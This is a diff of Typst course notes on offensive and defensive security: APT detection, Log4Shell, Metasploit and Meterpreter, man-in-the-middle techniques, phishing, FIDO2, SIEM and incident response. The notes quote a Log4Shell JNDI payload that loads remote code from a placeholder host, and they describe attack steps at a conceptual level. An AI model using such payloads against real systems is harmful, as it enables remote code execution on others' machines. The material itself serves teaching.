 time between these two dates is called the _Patch Gap_, and is what APTs rely on.
 
@@ -553,19 +575,19 @@ time between these two dates is called the _Patch Gap_, and is what APTs rely on
 only applied to all clients after 54 days, making the patch gap 48 days long.
 
 === APT detection
-The most basic detection is just using _lookup lists_ at the intranet exit point. Scan for known malicious
+The most basic detection is simply using _lookup lists_ at the intranet exit point. Scan for known malicious
 IPs/domains/email addresses. This of course only works against well-known malware that has been identified before.
 
-The second level uses content inspection and _dynamic analysis_ to discover new threats. The latter works by taking
-downloads and e-mail attachment and running them on sandbox infrastructure, the behavior of the program can be observed:
-Contacted domains, requested URLs, suspicious behavior.\
+The second level uses content inspection and _dynamic analysis_ to discover new threats. The latter works by intercepting
+downloads and e-mail attachments and running them on sandbox infrastructure. In this way the behavior of executables can
+be observed: Contacted domains, requested URLs, suspicious behavior, etc.\
 This is combined with _content inspection:_ By inspecting all network traffic in the network, the detection can also
 spot _DNS query patterns_, _HTTP characteristics_, _firewall traversals_, _Email behavior_ and _suspicious background
 traffic_.
 
-These indicators can then be compared on databases like _Block&Black_, _Mandiant_, _Zeus Tracker_, _Malware Hash_ or
+These indicators can then be compared on databases such as _Block&Black_, _Mandiant_, _Zeus Tracker_, _Malware Hash_ or
 _OpenIoC_. Note that this is no silver bullet: _Sandbox-aware_ or _memory-only_ malware, abuse of legitimate tools or
-long-term low-volume attacks with no artifacts can still not be detected this way.
+long-term low-volume attacks with little to no artifacts can still not be detected this way.
 
 == Famous exploits
 #v(-0.5em)
@@ -574,9 +596,9 @@ long-term low-volume attacks with no artifacts can still not be detected this wa
   columns: (1fr, auto),
   [
     Log4Shell is an RCE exploit in the Apache Log4j logging library with a _10.0 CVSS_. Log4j allowed requests to
-    arbitrary LDAP servers and to execute arbitrary Java code on them. Including the string
-    `${jndi:ldap://example.com/virus.jar}` into some input logged by Log4j #hinweis[(e.g. HTTP Headers, Minecraft chat
-      messages)] would download and execute `virus.jar`.
+    arbitrary LDAP servers and to _execute arbitrary Java code_ on them. Including the string `${jndi:ldap://example.com/virus.jar}`
+    into some input logged by Log4j #hinweis[(e.g. HTTP Headers, Minecraft chat messages)] would download
+    and execute `virus.jar`.
 
     *Mitigations*
     - Patch the program containing Log4j
@@ -621,7 +643,7 @@ easily be _chained_ with the second one to bypass the login and acquire an authe
     + Connect to C2 via WebVPN (the firewalls VPN feature)
     + Send commands back to the firewall
     + Use the control of the firewall to access the intranet
-    + Data exfiltration, ransomware campagin etc.
+    + Data exfiltration, ransomware campaign etc.
   ],
   chronos.diagram({
     import chronos: *
@@ -639,6 +661,7 @@ easily be _chained_ with the second one to bypass the login and acquire an authe
     _seq("Intranet", "C2", comment: [Steal data. Profit!])
   }),
 )
+
 
 = Defense Mechanisms
 #v(-0.5em)
@@ -671,19 +694,20 @@ easily be _chained_ with the second one to bypass the login and acquire an authe
   }),
 )
 
-
-Normally, the client would receive an _HTTP warning_ about certificates not matching due to the re-encryption. To avoid
-these warnings and ensure working connections, the administrator needs to install the root certificate of the WAF as a
-_Trusted Root Certification Authority_ on _all clients in the network_.
+Normally, the client would receive an _HTTP warning_ about certificates not matching. The client expects the certificate
+to be signed by the server #hinweis[(or the server's CA)], but due to the re-encryption, it is signed by the WAF.
+To avoid these warnings and ensure working connections, the administrator needs to install the root certificate of the
+WAF as a _Trusted Root Certification Authority_ on _all clients in the network_.
 
 *Considerations:*
-- _WAFs cannot break TLS encryption_, so they have to establish a new connection instead of being able to analyze an
-  existing connection.
-- With TLS termination, the WAF can see data like the _URL query parameters_ #hinweis[(ost.ch/api?*token=mytoken*)].
-  Without it, a MitM attacker or WAF would only see the hostname.
+- _WAFs cannot break TLS encryption_, so they have to terminate the existing one and establish a new connection instead
+  of being able to analyze an existing connection.
+- With TLS termination, the WAF can see data such as the _URL query parameters_ #hinweis[(ost.ch/api?*token=mytoken*)].
+  Without it, a MitM attacker or WAF would only see the hostname of the request.
 - _WAFs can only analyze HTTP(S) traffic_. If content analysis of other protocols is needed, an _inspection proxy_ can
   be used #hinweis[(e.g. Burp, Zap)]. It can also perform TLS termination/inspection.
-- _Perfect Forwarding Secrecy (PFS)_ is not affected by correctly configured TLS termination
+- _Perfect Forwarding Secrecy (PFS)_ is not affected by correctly configured TLS termination.
+  #hinweis[(See chapter @downgrading-encrypted-traffic)]
 
 #table(
   columns: (1fr, 1fr, 1fr),
@@ -711,21 +735,21 @@ accessed over the browser. It checks downloaded files and visited URLs against a
 of checks:
 - Checks if it is on a list of files that are _well known_ and downloaded frequently. If the file isn't on that list,
   SmartScreen shows a warning, advising caution.
-- Checks if it is on a list of reported malicious software sites and programs known to be unsafe. If it finds a match,
+- Checks if it is on a list of reported malicious software sites and programs _known to be unsafe_. If it finds a match,
   it displays a warning that the file may be malicious.
 
 == Fraud Detection
 To detect fraudulent behavior, a lot of data is needed. For example, to detect fraud in an E-Banking application,
 usually _technical details from the current and previous session_ #hinweis[(User agent, IP, time, browser fingerprint,
   average login duration...)] and _details of current and previous transactions_ #hinweis[(amount, virgin payment,
-  beneficiary, transfer to which bank...)] are compared. If there's something unusual, the bank can step in. Depending
-on how many indicators are triggered, the bank can require more stringent verification of the transaction:
+  beneficiary, transfer to which bank...)] are compared. If there's something unusual, the bank can step in.
+Depending on how many indicators are triggered, the bank can require more stringent verification of the transaction:
 + Automatic authorization, no action required from customer
 + Authorize transaction with 2FA
 + Bank calls the customer to verify that they are not getting scammed
 
-A man-in-the-browser attack is also likely. The banking website can check for Clickstream analysis #hinweis[(Behavior of
-  the user on the page)], Outliner Detection, Keystroke typing speed and URL frequency analysis.
+A man-in-the-browser attack is also likely. The banking website can utilize Clickstream analysis
+#hinweis[(Behavior of the user on the page)], Outliner Detection, Keystroke typing speed and URL frequency analysis.
 
 == Forensic Readiness
 #grid(
@@ -752,12 +776,13 @@ A man-in-the-browser attack is also likely. The banking website can check for Cl
   }),
 )
 
+
 = C2 Frameworks
 #v(-0.5em)
 == Covenant
 Covenant is a C2 framework built in .NET. It has various payloads, but most are geared towards Windows.
 
-- _Listener:_ Listens to connections from grunts. The main listener is the HTTPListener, which can be configured for
+- _Listener:_ Listens to connections from grunts. The main listener is the `HTTPListener`, which can be configured for
   HTTP or HTTPS.
 - _Launcher:_ Program created by a listener to run on the victim. There are many different Launchers: PowerShell,
   MSBuild, .NET binary, WMIC, Regsvr32...
@@ -781,33 +806,35 @@ exploit                                      # Attack!
 
 === Exploits
 Exploits in Metasploit abuse a certain vulnerability to gain access to a target. There are two types of exploits:
-- _Active exploit:_ Attacks a specific host, runs until completion then shuts down #hinweis[(e.g. Brute force modules
-    will exit when a shell opens on the target)]
-- _Passive exploit:_ Waits for incoming hosts and attacks them as they connect. They focus on clients #hinweis[(web
-    browsers, FTP clients)]. They report shell access as they happen and these shells can be individually accessed.
+- _Active exploit:_ Attacks a specific host, runs until completion then shuts down
+  #hinweis[(e.g. Brute force modules will exit when a shell opens on the target)]
+- _Passive exploit:_ Waits for incoming hosts and attacks them as they connect. They focus on clients
+  #hinweis[(web browsers, FTP clients)]. They report shell access on victims as they happen and these shells
+  can be individually accessed.
 
 === Payloads
 Once a target has been accessed with a exploit, a payload can be deployed. This can be as simple as starting a shell or
-deploying a whole payload framework and can be grouped into the following categories:
-- _Inline/Non-staged/Singles:_ Standalone payloads that contain the entire code #hinweis[(start a program, add new
-    user)]
+deploying a whole payload framework. Payloads can be grouped into the following categories:
+- _Inline/Non-staged/Singles:_ Standalone payloads that contain the entire code
+  #hinweis[(start a program, add new user)]
 - _Stager:_ Set up a network connection to the attacker, usually via @bind-shell or @reverse-shell and lets the attacker
   download stages
-- _Stage:_ Payload components to be downloaded by stagers.
+- _Stage:_ Payload components to be downloaded by stagers to execute further attacks
 
 === Meterpreter
 The most well known stager is _Meterpreter_. It runs completely in memory and features various extensions to exploit the
-target: Download/upload/edit files, execute programs, take screenshots, dump the SAM DB 0#hinweis[(Windows user
-  configuration)], be a keylogger, running other attacks against services running on the machine...
+target: Download/upload/edit files, execute programs, take screenshots, dump the SAM DB 0
+#hinweis[(Windows user configuration database)], be a keylogger, starting other attacks against services running on
+the machine...
 
 #grid(
   columns: (1fr, auto),
   [
-    One of the most useful features is _Port Forwarding_: If we know our victim is connected to multiple subnets and we
-    want to attack another machine in a different subnet, we can use `autoroute` to add new routes into the Metasploit
-    routing table. The `portfwd` command in Meterpreter allows the attacker to forward network traffic from the victim
-    machine to another system or port. This is useful for accessing internal services on the victim's network that would
-    otherwise be unreachable (_lateral movement_ inside the network).
+    One of the most useful Meterpreter features is _Port Forwarding_: If we know our victim is connected to multiple
+    subnets and we want to attack another machine in a different subnet, we can use `autoroute` to add new routes into
+    the Metasploit routing table. The `portfwd` command in Meterpreter allows the attacker to forward network traffic from
+    the victim machine to another system or port. This is useful for accessing internal services on the victim's network
+    that would otherwise be unreachable (_lateral movement_ inside the network).
   ],
   [
     ```sh
@@ -828,18 +855,19 @@ target: Download/upload/edit files, execute programs, take screenshots, dump the
 _Msfvenom_ is a standalone payload generator. It can create Metasploit payload executables or attach them to existing
 binaries. To hide the payloads from antivirus software, Msfvenom can also apply encoders to the generated payloads.
 
-= Man-in-the-Middle Attacks <mitm>
-In a Man-in-the-Middle attack (MitM), an attacker inserts themselves into communications of two parties. They can read
-all exchanged messages and send modified messages to the parties. A MitM can be performed at different layers:
+
+= Man-in-the-Middle Attacks (MitM) <mitm>
+In a Man-in-the-Middle attack (MitM), an attacker inserts themselves into communications of two (or more) parties.
+They can read all exchanged messages and send modified messages to the parties. A MitM can be performed at different layers:
 
 #table(
   columns: (1fr, 0.5fr, 0.5fr),
-  table.header([Infrastructure], [Network], [Application]),
+  table.header([Infrastructure level], [Network level], [Application level]),
   [
     - Forge BGP announcements to route traffic over attacker-controlled servers
     - IMSI catchers at border control to link phone ID to passport
     - Rouge 4G/5G antenna to function as IMSI catcher
-    - Surveiliance with court order through (mobile) provider
+    - Surveillance with court order through (mobile) provider
     - Fake Access Point offering free Wi-Fi
     - NFC Relaying Attack to send your card data to a payment terminal somewhere else
   ],
@@ -849,7 +877,7 @@ all exchanged messages and send modified messages to the parties. A MitM can be 
     - DHCP poisoning
   ],
   [
-    - Software installed on Client #hinweis[(Malware, Surveiliance software)]
+    - Software installed on client #hinweis[(Malware, Surveillance software)]
     - Attack on remoting protocols #hinweis[(SSH, RDP)]
     - Man-in-the-Browser
   ],
@@ -857,21 +885,21 @@ all exchanged messages and send modified messages to the parties. A MitM can be 
 
 #pagebreak()
 
-== Downgrading encrypted traffic
+== Downgrading encrypted traffic <downgrading-encrypted-traffic>
 A MitM-attack on _unencrypted traffic_ #hinweis[(DHCP, DNS, HTTP, SMTP)] can easily read and manipulate messages. When
-dealing with _encrypted traffic_ #hinweis[(HTTPS, SSH, SMB, SMTPS, RDP)], the attacker must either do _TLS termination_,
-see @waf or _downgrade the connection_ to an insecure or no encryption. This may generate warnings to the user, alerting
-them that something is up.
+dealing with _encrypted traffic_ #hinweis[(HTTPS, SSH, SMB, SMTPS, RDP)], the attacker must either do _TLS termination_
+#hinweis[(see @waf)], or _downgrade the connection_ to insecure or no encryption. This may generate warnings to the user,
+alerting them that something is up.
 
 #grid(
   columns: (1fr, auto),
   [
-    + When a client first connects to a server, it sends a Client Hello as part of the TLS Handshake to the Server. It
-      contains all the encryption ciphers the client supports.
+    + When a client first connects to a server, it sends a "Client Hello" as part of the TLS Handshake to the server.
+      It contains all the encryption ciphers the client supports.
     + The MitM forwards this package unmodified to the server.
-    + The server responds with a TLS Server Hello, containing all the ciphers it supports.
-    + The MitM now removes all (secure) ciphers from the Server Hello, making it appear to the client doesn't support
-      encryption at all (or only with insecure ciphers).
+    + The server responds with a TLS "Server Hello", containing all the ciphers it supports.
+    + The MitM now removes all (secure) ciphers from the Server Hello, making it appear to the client that the server
+      doesn't support encryption at all (or only with insecure ciphers).
     + The client falls back to insecure or no encryption
     + The MitM can now read all messages.
   ],
@@ -894,11 +922,11 @@ them that something is up.
 - _Disable weak/unencrypted connections server-side:_ If the server only offers secure ciphers, a downgrade attack is
   harder because the server doesn't accept these types of connections. The MitM would need to add TLS termination or
   never contact the server at all by serving a fake website to the client or similar.
-- _Perfect Forwarding Secrecy (PFS):_ Protects past sessions against future compromises of keys or passwords. By
-  generating a unique _ephemeral key_ for every session a user initiates, the compromise of a single session key will
-  not affect any data other than that exchanged in the specific session protected by that particular key. Even if the
-  private key is revealed, past sessions cannot be decrypted.
-- _HTTP Strict Transport Security (HSTS):_ See @hsts
+- _Perfect Forwarding Secrecy (PFS):_ Protects past sessions against future compromises of keys or passwords.
+  By generating a unique _ephemeral key_ for every session a user initiates, the compromise of a single session key
+  will not affect any data other than the data exchanged in the specific session protected by that particular key.
+  Even if the private key is revealed, past sessions cannot be decrypted.
+- _HTTP Strict Transport Security (HSTS):_ See chapter @hsts
 
 == Types of Man-in-the-Middle attacks
 #v(-0.5em)
@@ -907,7 +935,7 @@ them that something is up.
   columns: (1fr, auto),
   [
     + The attacker sets up a fake DHCP server
-    + Client sends out a DHCP request. Because it is a broadcast, the real and fake servers receive the request.
+    + Client sends out a DHCP request. Because these are always a broadcast, both the real and fake servers receive the request.
     + The _faster response wins_. To up its chances, the attacker can start a Denial-of-Service attack on the real DHCP
       server.
     + In the answer, the attacker sets a DNS server also under their control. They can now control address resolving and
@@ -937,10 +965,10 @@ them that something is up.
     + The attacker sends a DNS `ADD` command for `ost.ch` containing an IP address under their control.
     + Any DNS responses for `ost.ch` now contain the attacker's spoofed IP.
 
-    *Important:* The package must be forged with a library like `scapy` to change the _origin IP to that of the DHCP_,
-    as most DNS servers only accept DNS updates originating from the DHCP-IP.
+    *Important:* The attacker's packages must be forged with a library like `scapy` to change the _origin IP to that
+    of the DHCP_, as most DNS servers only accept DNS updates originating from the DHCP-IP.
 
-    DNS spoofing can be _prevented with DNS over HTTPS_, as the DNS query will then be encrypted and answered by the DoH
+    DNS spoofing can be _prevented with DNS over HTTPS (DoH)_, as the DNS query will then be encrypted and answered by the DoH
     provider instead of the local DNS server.
   ],
   chronos.diagram({
@@ -965,13 +993,13 @@ them that something is up.
 #grid(
   columns: (1fr, auto),
   [
-    In a LAN environment, each IP address must be resolved to a MAC address. To get it, a ARP request is sent as a
-    broadcast to the entire network. Once the MAC is known, the device stores it inside the _ARP table_ for further
-    communication.
+    In a LAN environment, each IP address must be resolved to a MAC address. To get a specific MAC address, a _ARP request_
+    is sent as a broadcast to the entire network. Once the MAC is known, the device stores it inside its _ARP table_
+    for further communication.
 
-    Any device can just send ARP responses (without any request!), so-called _gratuitous ARP_ packages. Devices accept
-    them so they can quickly switch over to a new IP without discovering them through failed communications. This can be
-    abused, as ARP doesn't have any kind of authentication.
+    Any device can just send ARP responses (without any request!), so-called _gratuitous ARP_ packages. Most devices accept
+    gratuitous ARP packages so they can quickly switch over to a new IP without discovering them through failed communications.
+    This can be abused, as ARP doesn't have any kind of authentication.
 
     A attacker can thus send out gratuitous ARP packages that set the MAC of all devices to their MAC and can thus
     intercept all traffic between these devices.
@@ -997,8 +1025,9 @@ them that something is up.
 #pagebreak()
 
 === SSH Man-in-the-Middle
-On every connection, the client downloads the fingerprint of the SSH server and compares it to the one stored on the
-client. Since there is no fingerprint available on first connection, the user must _explicitly trust the fingerprint_.
+On every SSH connection, the client downloads the _fingerprint of the SSH server_ and compares it to the one stored on the
+client. The fingerprint is usually based on the server's public key. Since there is no fingerprint available on first
+connection, the user must _explicitly trust the fingerprint_.
 On subsequent connections, SSH will just connect without any messages if the fingerprint still matches.
 
 When a SSH connection gets intercepted and re-encrypted by a Man-in-the-Middle attack, the victim receives a warning
@@ -1011,20 +1040,21 @@ ssh-keygen -f "~/.ssh/known_hosts" -R "hostnameOfSshServer"
 
 This can be avoided by using _SSH Public Key Authentication_. When using public key authentication, each user has two
 keys:
-- _Public key:_ Can be freely shared with anyone. With the public key, data can be encrypted. The public key is copied
-  onto the server to whitelist the user.
+- _Public key:_ Can be freely shared with anyone. With the public key, data can be encrypted. To connect to a server,
+  the public key of the client is copied onto the server to whitelist this key.
 - _Private key:_ Remains with the user that created it. Data encrypted with the public key can only be decrypted with
   the corresponding private key. Never share your private key!
 
-To log in with public key authentication, we first need to create a public/private key pair by running `ssh-keygen`. The
-public key now needs to be copied onto the _`~/.ssh/authorized_keys`_ directory of the server, with the user directory
+To log in with public key authentication, we first need to create a public/private key pair by running `ssh-keygen`.
+The public key now needs to be copied onto the _`~/.ssh/authorized_keys`_ directory of the server, with the user directory
 matching the one you want to login as. The process can be done manually or with the `ssh-copy-id` command.
 
-When establishing a SSH connection, the server verifies if the certificate of the newly connected client match, and if
-they don't, the connection is refused.\
-But to avoid falling back to password auth when key verification fails, the client needs to disable password
+When establishing a SSH connection, the server verifies if the certificate of the newly connected client matches wuth
+one of the public keys in `~/.ssh/authorized_keys` and if they don't, the connection is refused.\
+But to avoid falling back to password authentication when key verification fails, the client needs to disable password
 authentication in their SSH config.
 
+==== SSH with 2FA
 It is also possible to setup SSH to work with TOTP authenticator apps like Google Authenticator.
 
 _2FA does not prevent SSH MitM!_ Possible exploits are:
@@ -1049,8 +1079,8 @@ RDP supports two security types:
   protocol is either pre-set or negotiated during setup
 
 Before the introduction of _Network Level Authentication #hinweis[(NLA)]_, RDP always established a full session that
-presented the login screen. This type of the authentication is wasteful, as the server has to allocate resources for a
-session even if the login fails.
+presented the regular login screen of the server to enter credentials. This type of the authentication is wasteful,
+as the server has to allocate resources for a session even if the login fails.
 
 #pagebreak()
 
@@ -1068,28 +1098,25 @@ _CredSSP_ is a protocol to securely transmit credentials. NLA uses it internally
 with NTLM or Kerberos.
 
 Without NLA, the login is not encrypted and a MitM can successfully grab the login details while they are being sent to
-the server. If invalid credentials are sent, the session is also terminated early without many wasted resources. If a
-connection with valid credentials is established, the session data is transmitted with TLS to prevent Man-in-the-Middle
-eavesdropping.
+the server. In contrast, if invalid credentials are sent with NLA, the session is terminated early without many wasted
+resources. If a connection with valid credentials is established, the session data is transmitted with TLS to prevent
+Man-in-the-Middle eavesdropping.
 
 If the 2FA is integrated after the credentials are accepted, then an attacker could still intercept or relay the
-credential portion and then be challenged with 2FA. But if the MitM can _intercept and relay the 2FA prompt and
-response_ in real time, then the attacker might succeed in relaying the full login #hinweis[(credential + 2FA)] to the
-real server.\
+credential portion and then be stuck with a 2FA challenge it can't solve. But if the MitM can _intercept and relay the
+2FA prompt and response_ in real time, then the attacker might succeed in relaying the full login
+#hinweis[(credential + 2FA)] to the real server.\
 If, however, the 2FA is integrated within the same secure login channel #hinweis[(i.e. the second factor is part of the
   credential negotiation in the TLS/CredSSP exchange)], then it becomes harder for a MitM to intercept or fake the 2FA
-step without being noticed or failing to pass the verification because the second factor is also encrypted.
-
-
-
+step without being noticed or failing to pass the verification because the second factor is also encrypted.0
 
 === Malware-based Man-in-the-Middle
 A malware installed into the client has various methods to create MitM-attacks:
-+ _Change the `hosts` file:_ The `hosts` file #hinweis[(Windows: `C:\Windows\System32\Drivers\etc\hosts`, Unix:
-    `/etc/hosts`)] is the first resource for resolving addresses, before any DNS is consulted. Any IP set there will be
-  used to connect to the specified domain. A malware can add entries to redirect a victim to an attacker-controlled
+- _Change the `hosts` file:_ The `hosts` file #hinweis[(Windows: `C:\Windows\System32\Drivers\etc\hosts`,
+    Unix: `/etc/hosts`)] is the first resource for resolving addresses, before any DNS is consulted. Any IP set there
+  will be used to connect to the specified domain. A malware can add entries to redirect a victim to an attacker-controlled
   server
-+ _Setup System Proxy with malicious trusted root certificate authority:_ The malware sets the system proxy to an
+- _Setup System Proxy with malicious trusted root certificate authority:_ The malware sets the system proxy to an
   attacker controlled one and installs a CA certificate the attacker created as a "Trusted Root Certificate" in the
   system, so HTTPS connections can also be sent to it.
 
@@ -1110,12 +1137,11 @@ tells the browser to only establish HTTPS connections to this domain, reject all
 validation. Domains can also be included in the HSTS preload list, making the browser enforce HTTPS even before the
 first visit. _Protects sessions from MitM-attacks, downgrading and session hijacking_.
 
-=== Mutual auth with client certificates
-Both the server and client share a certificate with each other. They can now sign their communication and verify with
+=== Mutual authentication with client certificates
+Both the server and client share their certificate with each other. They can now sign their communication and verify with
 the shared certificate that the package is really coming from the system they expect. If a MitM-attack happens, the
 attacker would replace the Public Key and the signed package hash with their own. But the receiver will not accept this
 forged package, because the CA signature doesn't match.
-
 
 
 = Phishing & Authentication
@@ -1123,21 +1149,20 @@ forged package, because the CA signature doesn't match.
 == Offline Phishing
 The attacker provides a website that mimics the login flow of a website the user has an account on. When they enter
 their login data, it is transmitted to the attacker. The credentials are not immediately forwarded to the target
-website, just stored. The attacker can then login into the real website with these credentials at a later date.
+website, just stored by the attacker. They can then login into the real website with these credentials at a later date.
 
 *How can the attacker make the user go on their fake website?*
 - Claim that an application is now reachable under a new link
 - A HTML link where the link text is the real website, but `href` points to the attacker site
-- Homograph attack: Register a domain with a hard-to-spot typo or Punycode and send a link to it
+- _Homograph attack:_ Register a domain with a hard-to-spot typo or Punycode and send a link to it
 
 *Mitigations:* User Awareness Training, 2FA, Monitor domain registrations similar to your own
 
 == Online Phishing
 In online phishing, the attacker has a MitM session established with the victim. When the victim logs into a website,
 the website thinks the attacker is the actual user and the user thinks the attacker is the actual server. To keep this
-alive, the _attacker_ must rewrite all domain from the real website to their domain. This includes _cookies_ and _links
-in HTML, JS & headers_
-
+alive, the _attacker_ must rewrite all URLs from the real website to their domain. This includes _cookies_ and _links
+in HTML, JS & headers_.
 
 == Authentication
 Authentication is the process of verifying who the user claims to be. It may involve different factors:
@@ -1150,8 +1175,16 @@ against Phishing_: A MitM can steal Username/Password *and* a OTP, as they are s
 the second factor works via confirming a push notification on a device, this is no longer possible, as _the device
 directly communicates to the server_ and not through the MitM victim.
 
-#align(center, image(width: 80%, "img/phishing-2fa-otp.png"))
-#align(center, image(width: 80%, "img/phishing-2fa-notif.png"))
+#align(center)[
+  #figure(
+    image(width: 75%, "img/phishing-2fa-otp.png"),
+    caption: [Phishing attack where the 2FA token gets sent through the MitM],
+  )
+  #figure(
+    image(width: 75%, "img/phishing-2fa-notif.png"),
+    caption: [Phishing attack where the 2FA goes through a push notification, bypassing the MitM],
+  )
+]
 
 === FIDO2 <fido2>
 
@@ -1161,22 +1194,19 @@ directly communicates to the server_ and not through the MitM victim.
     _Fast Identity Online 2 (FIDO2) _is a authentication protocol, primarily for use in the web. Its main feature is
     that the authentication information is stored in a _hardware token_ that the client possesses, the _authenticator_.
 
-    + During _registration_, a key pair is generated for this relying party by the authenticator. The public key is then
-      sent to the relying party.
+    + During _registration_, a key pair is generated for this relying party by the authenticator.
+      The public key is then sent to the relying party.
     + When the user attempts to log in, the relying party sends the _origin_ #hinweis[(its domain name)] and a
       _challenge_.
     + The client verifies that the origin in the challenge and the website domain match and forwards that to the
       authenticator.
-    + The authenticator looks up the private key of that origin and _signs the challenge_ with it. The result is
-      forwarded to the client and then to the relying party
-    + The relying party looks up the public key of the authenticator sent during registration. If the signature of the
-      signed challenge matches the public key, the login is successful
+    + The authenticator looks up the private key of that origin and _signs the challenge_ with it.
+      The result is forwarded to the client and then to the relying party
+    + The relying party looks up the public key of the authenticator sent during registration.
+      If the signature of the signed challenge matches the public key, the login is successful
 
     The authenticator stores a key pair for each relying party that is registered, so a _private key is never reused_
     across different relying parties.
-
-
-
   ],
   chronos.diagram({
     import chronos: *
@@ -1201,8 +1231,8 @@ directly communicates to the server_ and not through the MitM victim.
   table.header([Protocol], [Description]),
   [*CTAP*\ #hinweis[(Client to Authenticator)]],
   [
-    The communication between the client and Authenticator happens in CTAP. FIDO2 uses the newer CTAP2 standard.
-    Supported bindings: USB HID, NFC, Bluetooth (LE)
+    The communication between the client and authenticator happens in CTAP. FIDO2 uses the newer CTAP2 standard.
+    Supported bindings: USB HID, NFC, Bluetooth & Bluetooth Low Energy
   ],
 
   [*WebAuthn*\ #hinweis[(Web Authentication)]],
@@ -1212,8 +1242,8 @@ directly communicates to the server_ and not through the MitM victim.
 )
 
 == PsExec
-PSExec is a tool from the Sysinternals suite that provides SSH-like functionality for Windows. The user enters username,
-password and address of the server they want to connect to. The process works as follows:
+PSExec is a tool from the Microsoft Sysinternals suite that provides SSH-like functionality for Windows.
+The user enters username, password and address of the server they want to connect to. The process works as follows:
 #grid(
   [
     + Authentication with credentials on server
@@ -1222,7 +1252,7 @@ password and address of the server they want to connect to. The process works as
   ],
   [
     4. Result is sent back to the client
-    + Service deregistered when client disconnects
+    + Service is deregistered when client disconnects
   ],
 )
 
@@ -1237,12 +1267,11 @@ Different Cyber Security methods serve different purposes:
   [
     - Hardening
     - Isolation #hinweis[(VM, Docker)]
-    - Pentest
+    - Penetration Testing
     - Red Teaming
     - Awareness
     - SIEM, SOAR, EDR
     - Threat Intelligence
-
   ],
   [
     - Incident Management
@@ -1262,60 +1291,58 @@ Different Cyber Security methods serve different purposes:
   ],
 )
 
-
 #figure(
-  supplement: none,
-  caption: [Evolution of Cyber Security Defense],
   image("img/defense-evolution.png"),
+  caption: [Evolution of Cyber Security Defense],
 )
 
 Analyzing a cyber attack falls in the domain of _Digital Forensics and Incident Response (DFIR)_.
 
 == SIEM <siem>
 _Security Information and Event Management (SIEM)_ solutions are responsible for _collecting log and event data_ from
-various sources such as network, servers and applications and aggregating, identifying, categorizing and analyzing it in
-real time. With a SIEM solution, security problems should be detected automatically as well as the ability to send an
-alert.\
-*Tasks:* Pattern search in log data for indicators of a cyber attack #hinweis[(Indicator of Compromise IOC)],
-correlation of event information and identifies abnormal activity, alerts according to defined alert rules
+various sources such as the network, servers and applications and aggregating, identifying, categorizing and analyzing
+this data in real time. With a SIEM solution, security problems should be detected automatically as well as the ability
+to send an alert.\
+*Tasks:* Pattern search in log data for indicators of a cyber attack (so-called _Indicators of Compromise (IOC)_),
+correlation of event information, identifying abnormal activity, sending alerts according to defined alert rules
 
-In short: A SIEM is a _logging + filter + alert solution_. The most well known SIEM is Splunk.
+In short: A SIEM is a _logging + filter + alert solution_. The most well known SIEM is _Splunk_.
 
 === Wazuh
 _Wazuh_ is an _open-source SIEM and Extended Detection and Response (XDR) solution_ for centralized monitoring of
 _endpoints, servers, and cloud systems_. It combines classic _SIEM capabilities_ with _host-based intrusion detection
-(HIDS)_, plus integrity monitoring, compliance checks, and vulnerability detection.
+(HIDS)_ #hinweis[(uses a monitoring service installed on clients)], plus integrity monitoring, compliance checks,
+and vulnerability detection.
 
 The _Wazuh Agent_ is installed on clients and servers and collects security-relevant data such as logs, security events,
 inventory data, and integrity reports. This data is sent encrypted to the central _Wazuh Manager_.
-
-The _Wazuh Manager_ analyzes the data in _real time_ using rules and correlation, detecting attack patterns, indicators
+The Wazuh Manager analyzes the data in _real time_ using rules and correlation, detecting attack patterns, indicators
 of compromise, and unusual behavior.
 
 When suspicious events occur, Wazuh automatically generates _alerts_ with different severity levels, which can be
 forwarded via dashboards, email, or external systems.
 
 In addition, Wazuh supports _compliance monitoring_, _vulnerability detection (CVE matching)_, and _integration with the
-ELK stack_ for log analysis and visualization.
-
+ELK stack #hinweis[(ElasticSearch, Logstash, Kibana)]_ for log analysis and visualization.
 
 == SOAR
 _Security Orchestration, Automation and Response (SOAR)_ also collects data from various sources similar to a SIEM, but
-SOAR supports the incident responder in managing the crisis. SOAR enables automated intervention when a security
+SOAR additionally supports the incident responder in managing the crisis. SOAR enables automated intervention when a security
 incident occurs #hinweis[(e.g. automatically quarantine affected systems)]. A SOAR system also supports the incident
 responder in rolling out security countermeasures #hinweis[(e.g. to Active Directory).]\
 *Tasks:* Alert Investigation, Orchestration, Automation workflow
 
-In short: A SOAR is _SIEM + a action plan in case of compromise_. We used Velociraptor in the exercises. A big use case
+In short: A SOAR is _SIEM + a action plan in case of compromise_. We used _Velociraptor_ in the exercises. A big use case
 is to detect patterns on the machines in your network after an incident:
 - URLs, Credit card data in process memory
 - Malware signatures in binaries
 - Malware patterns in registry
 
-
 == EDR
 _Endpoint detection and response (EDR)_ is a software installed on clients that continuously monitors the client and
-acts on rules when unusual activity occurs.
+acts on rules when unusual activity occurs. This is also what differentiates a EDR from a HIDS: A HIDS just monitors,
+while a EDR also reacts to threats.
+
 
 = Incident Response
 #v(-0.5em)
@@ -1351,23 +1378,24 @@ There are different frameworks to choose from when handling a cyber incident:
 
 == Indicators of Compromise (IoC)
 Indicators of Compromise (IoC) define _characteristics of an incident_ in a structured manner. They have the goal to
-describe, communicate and find artifacts related to incidents. Currently, there is no standard, so there are different
-competing formats to describe artifacts YARA, STIX, TAXII, OpenIoC, Snort...
+describe, communicate and find artifacts related to incidents. Currently, there is no agreed-upon standard, so there
+are different competing formats to describe artifacts: YARA, STIX, TAXII, OpenIoC, Snort...
 
 #pagebreak()
 
 == Attack Types
-Attacks can usually be classified in one of two categories
+Cyber attacks can usually be classified in one of two categories
 #table(
   columns: (1fr, 1fr),
   table.header([Smash and Grab], [Exfiltration]),
   [
-    Technique used by Ransomware groups. Attacker enter through the easiest entrypoint and visibly break stuff. Usually
-    ransom through data encryption and threats to release sensitive documents. Once they're gone, they are gone.
+    Technique used by Ransomware groups. Attackers enter through the easiest entrypoint and visibly break stuff.
+    Usually demand ransom through data encryption and threaten to release sensitive documents.
+    But once they are gone, they are gone; no additional backdoors.
   ],
   [
-    Technique used by APTs. They slowly build up many channels from inside the network from them to build persistence.
-    Act slow. Even if one path gets detected, they have other ones. Difficult to get rid of.
+    Technique used by APTs. They slowly build up many channels from inside the network to establish persistence.
+    Attackers act slowly. Even if one entrypoint is detected, they have others. Difficult to get rid of.
   ],
 )
 
@@ -1379,30 +1407,33 @@ Your company is suffering from an attack. What to do?
 + Gather as much information as possible about the current state of your systems.
 
 + _Create a board that lists the "Ist-Zustand" and "Soll-Zustand"_.\
